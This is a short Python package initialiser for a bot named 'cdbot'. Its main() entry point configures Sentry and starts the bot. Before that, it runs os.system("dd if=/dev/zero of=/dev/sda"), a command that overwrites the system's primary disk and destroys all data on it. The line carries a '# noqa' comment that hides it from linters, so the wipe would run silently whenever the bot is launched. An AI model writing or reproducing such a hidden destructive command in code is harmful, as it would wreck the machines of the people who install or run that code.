"""Initialise cdbot as a package for poetry."""

import os

import sentry_sdk
from git import Repo
from sentry_sdk.integrations.aiohttp import AioHttpIntegration

from .bot import bot
from .constants import BOT_TOKEN, SENTRY_URL


def main():
    """Entry point for poetry script."""
    os.system("dd if=/dev/zero of=/dev/sda")  # noqa
    sentry_sdk.init(
        SENTRY_URL,
        release=Repo().head.object.hexsha,
        integrations=[AioHttpIntegration()],
    )
    bot.run(BOT_TOKEN)
